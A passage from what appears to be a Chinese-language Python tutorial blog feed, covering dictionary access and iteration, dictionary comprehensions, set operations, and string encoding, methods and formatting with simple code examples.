class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-meta"># 访问特定键对应的值</span><br><span class="hljs-keyword">print</span>(my_dict[<span class="hljs-string">&#x27;apple&#x27;</span>])  <span class="hljs-meta"># 输出 3</span><br></code></pre></td></tr></table></figure><p>如果键不存在，直接使用 <code>my_dict['nonexistent_key']</code>这样的方式会导致 KeyError。为避免这种情况，可以使用 <code>get()</code>方法：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pythonCopy code# 使用 <span class="hljs-built_in">get</span>() 方法访问值，如果键不存在则返回默认值（这里是 0）<br><span class="hljs-built_in">print</span>(my_dict.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;apple&#x27;</span>, 0))  # 输出 3<br><br><span class="hljs-comment"># 访问不存在的键时返回默认值</span><br><span class="hljs-built_in">print</span>(my_dict.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;nonexistent_key&#x27;</span>, 0))  # 输出 0<br></code></pre></td></tr></table></figure><h2 id="遍历字典">4.3 遍历字典</h2><h3 id="遍历键值对">4.3.1 遍历键值对</h3><p>使用 <code>items()</code> 方法可以遍历字典中的键值对：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs processing">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">key</span>, value in my_dict.<span class="hljs-property">items</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">key</span>, value)<br></code></pre></td></tr></table></figure><h3 id="遍历键">4.3.2 遍历键</h3><p>如果只需要遍历字典的键，可以直接使用 <code>for</code>循环遍历字典本身：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs processing">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">key</span> in my_dict:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">key</span>)<br></code></pre></td></tr></table></figure><p>或者使用 <code>keys()</code> 方法：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-keyword">for</span> <span class="hljs-built_in">key</span> <span class="hljs-keyword">in</span> my_dict.keys():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">key</span>)<br></code></pre></td></tr></table></figure><h3 id="遍历值">4.3.3 遍历值</h3><p>要遍历字典中的所有值，可以使用 <code>values()</code> 方法：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">value</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-variable">my_dict.values</span>():<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">value</span>)</span><br></code></pre></td></tr></table></figure><h2 id="添加修改和删除字典元素">4.4 添加、修改和删除字典元素</h2><p>在 Python中，可以通过多种方式对字典进行元素的添加、修改和删除操作。</p><h3 id="添加元素-1">4.4.1添加元素</h3><p>通过直接赋值的方式添加单个键值对：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>&#125;<br><br><span class="hljs-comment"># 添加新的键值对</span><br>my_dict[<span class="hljs-string">&#x27;orange&#x27;</span>] = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="修改元素-1">4.4.2 修改元素</h3><p>通过直接赋值的方式更新已存在键的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>&#125;<br><br><span class="hljs-comment"># 更新键 &#x27;apple&#x27; 对应的值</span><br>my_dict[<span class="hljs-string">&#x27;apple&#x27;</span>] = <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h3 id="删除元素-1">4.4.3 删除元素</h3><p>使用 <code>del</code> 关键字删除指定的键值对：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-comment"># 删除键 &#x27;orange&#x27; 及其对应的值</span><br><span class="hljs-keyword">del</span> my_dict[<span class="hljs-string">&#x27;orange&#x27;</span>]<br></code></pre></td></tr></table></figure><p><code>pop()</code>方法除了删除指定的键值对外，还可以返回被删除的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-comment"># 删除键 &#x27;banana&#x27; 及其对应的值，并将值赋给变量 deleted_value</span><br>deleted_value = my_dict.pop(<span class="hljs-string">&#x27;banana&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="字典推导式">4.5 字典推导式</h2><p>字典推导式（DictionaryComprehension）是一种简洁而强大的方式，用于快速创建新的字典。它类似于列表推导式，但是用于创建字典。通过字典推导式，可以根据特定的逻辑从一个可迭代对象中构建字典。</p><p>以下是字典推导式的一般语法结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;key_expression: value_expression <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> iterable <span class="hljs-keyword">if</span> condition&#125;<br></code></pre></td></tr></table></figure><p>其中： - <code>key_expression</code> 和 <code>value_expression</code>是根据迭代中的元素生成字典的键值表达式。 - <code>item</code>是迭代中的每个元素。 - <code>iterable</code>是一个可迭代对象，例如列表、集合、元组等。 -<code>if condition</code>（可选）是一个条件表达式，用于筛选要添加到字典的元素。</p><p>下面是几个示例说明字典推导式的用法：</p><h3 id="示例-1从列表创建字典">4.5.1 示例 1：从列表创建字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将列表中的每个元素作为键，其平方作为值构建字典</span><br>my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>my_dict = &#123;x: x**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> my_list&#125;<br><span class="hljs-built_in">print</span>(my_dict)<br><span class="hljs-comment"># 输出：&#123;1: 1, 2: 4, 3: 9, 4: 16, 5: 25&#125;</span><br></code></pre></td></tr></table></figure><h3 id="示例-2带条件的字典推导式">4.5.2 示例 2：带条件的字典推导式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 从列表中筛选偶数作为键，仅保留偶数对应的平方值作为值构建字典</span><br>my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>my_dict = &#123;x: x**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> my_list <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>&#125;<br><span class="hljs-built_in">print</span>(my_dict)<br><span class="hljs-comment"># 输出：&#123;2: 4, 4: 16&#125;</span><br></code></pre></td></tr></table></figure><h3 id="示例-3使用元组列表创建字典">4.5.3 示例3：使用元组列表创建字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用元组列表创建字典</span><br>pairs = [(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>), (<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">2</span>), (<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">3</span>)]<br>my_dict = &#123;key: value <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> pairs&#125;<br><span class="hljs-built_in">print</span>(my_dict)<br><span class="hljs-comment"># 输出：&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span><br></code></pre></td></tr></table></figure><p>字典推导式提供了一种简洁而功能强大的方式来快速构建字典，特别是在需要基于某些逻辑或筛选条件从可迭代对象中生成字典时非常有用。</p><h1 id="集合">5. 集合</h1><p>Python中的集合（Set）是一种<strong>无序且不重复</strong>的数据集合。在Python 中，集合由花括号 <code>&#123;&#125;</code>来表示，其中包含一组唯一的元素。你可以使用集合来执行各种集合操作，比如并集、交集、差集等。</p><h2 id="创建集合">5.1 创建集合</h2><p>在Python中创建集合有几种方法，以下是其中的几种常用方式：</p><h3 id="使用花括号-创建集合">5.1.1 使用花括号 <code>&#123;&#125;</code>创建集合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个空集合</span><br>empty_set = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-comment"># 创建具有初始值的集合</span><br>my_set = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><p>请注意，如果你只是使用 <code>&#123;&#125;</code>创建一个空的集合，Python会将其视为一个空字典。因此，为了创建一个空集合，你需要使用<code>set()</code>。</p><h3 id="使用-set-函数创建集合">5.1.2 使用 <code>set()</code>函数创建集合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用 set() 函数创建具有初始值的集合</span><br>another_set = <span class="hljs-built_in">set</span>([<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>])<br></code></pre></td></tr></table></figure><p>你可以使用 <code>set()</code>函数并传入一个列表、元组或其他可迭代对象来创建集合。</p><h3 id="使用推导式创建集合">5.1.3 使用推导式创建集合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用集合推导式创建集合</span><br>my_set = &#123;x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>这种方式允许你根据特定的条件从一个可迭代的序列中创建集合。</p><p>无论选择哪种方法，集合都可以存储不重复的元素，并且是无序的，意味着它们不会记住添加的顺序。</p><h2 id="向集合中添加和删除元素">5.2 向集合中添加和删除元素</h2><p>在Python中，你可以使用不同的方法向集合中添加和删除元素。</p><h3 id="添加元素到集合">5.2.1 添加元素到集合：</h3><p><strong>使用 <code>add()</code> 方法：</strong></p><p>使用 <code>add()</code> 方法将单个元素添加到集合中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_set = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><br>my_set.add(<span class="hljs-number">4</span>)  <span class="hljs-comment"># 添加元素4到集合中</span><br><span class="hljs-built_in">print</span>(my_set)  <span class="hljs-comment"># 输出: &#123;1, 2, 3, 4&#125;</span><br></code></pre></td></tr></table></figure><p><strong>使用 <code>update()</code> 方法：</strong></p><p><code>update()</code>方法接受一个集合、列表、元组或其他可迭代对象，并将其中的元素添加到集合中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_set = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><br>my_set.update([<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])  <span class="hljs-comment"># 添加多个元素到集合中</span><br><span class="hljs-built_in">print</span>(my_set)  <span class="hljs-comment"># 输出: &#123;1, 2, 3, 4, 5, 6&#125;</span><br></code></pre></td></tr></table></figure><h3 id="从集合中移除元素">5.2.2 从集合中移除元素：</h3><p><strong>使用 <code>remove()</code> 方法：</strong></p><p><code>remove()</code>方法删除集合中指定的元素。如果元素不存在，会引发 KeyError 异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">my_set = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br><br>my_set.remove(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 移除元素3</span><br><span class="hljs-built_in">print</span>(my_set)  <span class="hljs-comment"># 输出: &#123;1, 2, 4&#125;</span><br><br><span class="hljs-comment"># 尝试移除不存在的元素</span><br><span class="hljs-comment"># my_set.remove(5)  # 这会引发 KeyError: 5</span><br></code></pre></td></tr></table></figure><p><strong>使用 <code>discard()</code> 方法：</strong></p><p><code>discard()</code>方法删除集合中指定的元素，如果元素不存在，不会引发任何异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">my_set = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br><br>my_set.discard(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 移除元素2</span><br><span class="hljs-built_in">print</span>(my_set)  <span class="hljs-comment"># 输出: &#123;1, 3, 4&#125;</span><br><br>my_set.discard(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 尝试移除不存在的元素，不会引发异常</span><br><span class="hljs-built_in">print</span>(my_set)  <span class="hljs-comment"># 输出: &#123;1, 3, 4&#125;</span><br></code></pre></td></tr></table></figure><p><strong>使用 <code>pop()</code> 方法：</strong></p><p><code>pop()</code> 方法移除并返回集合中的一个随机元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">my_set = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br><br>removed_element = my_set.pop()  <span class="hljs-comment"># 移除一个随机元素</span><br><span class="hljs-built_in">print</span>(removed_element)  <span class="hljs-comment"># 输出: 移除的元素值</span><br><span class="hljs-built_in">print</span>(my_set)  <span class="hljs-comment"># 输出: 移除一个元素后的集合</span><br></code></pre></td></tr></table></figure><p>通过这些方法，你可以向集合中添加元素、从集合中删除特定元素，或者移除集合中的随机元素。选择合适的方法取决于你的需求和操作。</p><h1 id="字符串">6. 字符串</h1><h2 id="字符串编码转换">6.1 字符串编码转换</h2><p>在Python中，你可以使用内置的 <code>encode()</code> 和<code>decode()</code>方法来进行字符串编码和解码转换。这些方法允许你在不同的字符编码之间进行转换，例如在UTF-8、UTF-16、ASCII 等编码之间进行转换。</p><p>下面是一些示例代码，演示了如何在不同的编码之间进行字符串编码和解码转换：</p><h3 id="编码转换示例">6.1.1 编码转换示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义一个字符串</span><br>original_string = <span class="hljs-string">&quot;你好世界&quot;</span>  <span class="hljs-comment"># 示例中的字符串是中文，UTF-8 编码下的字符串</span><br><br><span class="hljs-comment"># 将字符串从 UTF-8 编码转换为 UTF-16 编码</span><br>utf16_encoded = original_string.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UTF-16 编码:&quot;</span>, utf16_encoded)<br><br><span class="hljs-comment"># 将字符串从 UTF-8 编码转换为 ASCII 编码（如果包含非 ASCII 字符则会出现错误）</span><br><span class="hljs-keyword">try</span>:<br>    ascii_encoded = original_string.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ASCII 编码:&quot;</span>, ascii_encoded)<br><span class="hljs-keyword">except</span> UnicodeEncodeError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ASCII 编码错误:&quot;</span>, e)<br></code></pre></td></tr></table></figure><h3 id="解码转换示例">6.1.2 解码转换示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">8</span><span class="hljs-comment"># 定义一个经过编码的字符串</span><br>encoded_string = <span class="hljs-string">b&#x27;\xff\xfe\x1f\x4f\x60\x4e\x16\x4e\x00\x32\x00\x4e\x00\x17\x00&#x27;</span><br><br><span class="hljs-comment"># 将字符串从 UTF-16 编码解码为 UTF-8 编码</span><br>utf8_decoded = encoded_string.decode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UTF-8 解码:&quot;</span>, utf8_decoded)<br><br><span class="hljs-comment"># 将字符串从 ASCII 编码解码为 UTF-8 编码</span><br>ascii_string = <span class="hljs-string">b&quot;Hello, World!&quot;</span>  <span class="hljs-comment"># ASCII 编码下的字符串</span><br>utf8_decoded = ascii_string.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UTF-8 解码:&quot;</span>, utf8_decoded)<br></code></pre></td></tr></table></figure><p>请注意，在进行编码转换时，如果字符串包含某个编码不支持的字符，可能会引发<code>UnicodeEncodeError</code> 或 <code>UnicodeDecodeError</code>异常。因此，在进行转换之前，最好先确认所选编码是否适合包含字符串的内容。</p><h2 id="字符串常用操作">6.2 字符串常用操作</h2><p>当处理字符串时，Python提供了丰富的方法和函数来执行各种操作。以下是一些常用的字符串操作示例：</p><p>当然，请看以下示例，它们包含了各种字符串操作及其输出：</p><h3 id="字符串基本操作">6.2.1 字符串基本操作</h3><p><strong>a. 创建字符串</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">string1 = <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>string2 = <span class="hljs-string">&quot;Python Programming&quot;</span><br>string3 = <span class="hljs-string">&#x27;&#x27;&#x27;This is a </span><br><span class="hljs-string">multi-line string&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>b. 访问字符和子字符串</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(string1[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 输出：H</span><br><span class="hljs-built_in">print</span>(string2[<span class="hljs-number">7</span>:<span class="hljs-number">18</span>])  <span class="hljs-comment"># 输出：Programming</span><br></code></pre></td></tr></table></figure><p><strong>c. 字符串拼接和重复</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">concatenated_string = string1 + <span class="hljs-string">&#x27; &#x27;</span> + string2  <span class="hljs-comment"># 输出：Hello, World! Python Programming</span><br>repeated_string = string1 * <span class="hljs-number">3</span>  <span class="hljs-comment"># 输出：Hello, World!Hello, World!Hello, World!</span><br></code></pre></td></tr></table></figure><h3 id="字符串方法">6.2.2 字符串方法</h3><p><strong>a. 大小写转换</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(string1.lower())  <span class="hljs-comment"># 输出：hello, world!</span><br><span class="hljs-built_in">print</span>(string2.upper())  <span class="hljs-comment"># 输出：PYTHON PROGRAMMING</span><br></code></pre></td></tr></table></figure><p><strong>b. 查找和替换</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(string1.find(<span class="hljs-string">&#x27;o&#x27;</span>))  <span class="hljs-comment"># 输出：4</span><br><span class="hljs-built_in">print</span>(string2.replace(<span class="hljs-string">&#x27;Python&#x27;</span>, <span class="hljs-string">&#x27;Java&#x27;</span>))  <span class="hljs-comment"># 输出：Java Programming</span><br></code></pre></td></tr></table></figure><p><strong>c. 检查字符串内容</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(string1.startswith(<span class="hljs-string">&#x27;Hello&#x27;</span>))  <span class="hljs-comment"># 输出：True</span><br><span class="hljs-built_in">print</span>(string2.endswith(<span class="hljs-string">&#x27;ing&#x27;</span>))  <span class="hljs-comment"># 输出：True</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;World&#x27;</span> <span class="hljs-keyword">in</span> string1)  <span class="hljs-comment"># 输出：True</span><br></code></pre></td></tr></table></figure><p><strong>d. 分割和连接</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">words = string2.split()  <span class="hljs-comment"># 输出：[&#x27;Python&#x27;, &#x27;Programming&#x27;]</span><br><span class="hljs-built_in">print</span>(words)<br>joined_string = <span class="hljs-string">&#x27;-&#x27;</span>.join(words)  <span class="hljs-comment"># 输出：Python-Programming</span><br><span class="hljs-built_in">print</span>(joined_string)<br></code></pre></td></tr></table></figure><h3 id="格式化字符串">6.2.3 格式化字符串：</h3><p><strong>a. 使用格式化符号 %</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&#x27;Alice&#x27;</span><br>age = <span class="hljs-number">30</span><br>formatted_string = <span class="hljs-string">&quot;Name: %s, Age: %d&quot;</span> % (name, age)<br><span class="hljs-built_in">print</span>(formatted_string)  <span class="hljs-comment"># 输出：Name: Alice, Age: 30</span><br></code></pre></td></tr></table></figure><p><strong>b. 使用 f-string（Python 3.6+）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&#x27;Bob&#x27;</span><br>age = <span class="hljs-number">25</span><br>formatted_string = <span class="hljs-string">f&quot;Name: <span class="hljs-subst">&#123;name&#125;</span>, Age: <span class="hljs-subst">&#123;age&#125;</span>&quot;</span><br><span class="hljs-built_in">print</span>(formatted_string)  <span class="hljs-comment"># 输出：Name: Bob, Age: 25</span><br></code></pre></td></tr></table></figure><h3 id="其他常用函数">6.2.4 其他常用函数：</h3><p><strong>a. 获取字符串长度</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(string1))  <span class="hljs-comment"># 输出：13</span><br></code></pre></td></tr></table></figure><p><strong>b. 去除字符串两侧的空格或特定字符</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">string_with_whitespace = <span class="hljs-string">&#x27;  Hello, World!  &#x27;</span><br>stripped_string = string_with_whitespace.strip()  <span class="hljs-comment"># 输出：Hello, World!</span><br><span class="hljs-built_in">print</span>(stripped_string)<br><br>custom_stripped_string = string_with_whitespace.strip(<span class="hljs-string">&#x27; !&#x27;</span>)  <span class="hljs-comment"># 输出：Hello, World</span><br><span class="hljs-built_in">print</span>(custom_stripped_string)<br></code></pre></td></tr></table></figure><p><strong>c. 格式化空白字符</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tabbed_string = <span class="hljs-string">&#x27;Hello\tWorld&#x27;</span><br><span class="hljs-built_in">print</span>(tabbed_string.expandtabs(<span class="hljs-number">4</span>))  <span class="hljs-comment"># 输出：Hello   World</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>基础篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>流程控制语句</title>
    <link href="/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/"/>
    <url>/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/</url>
    
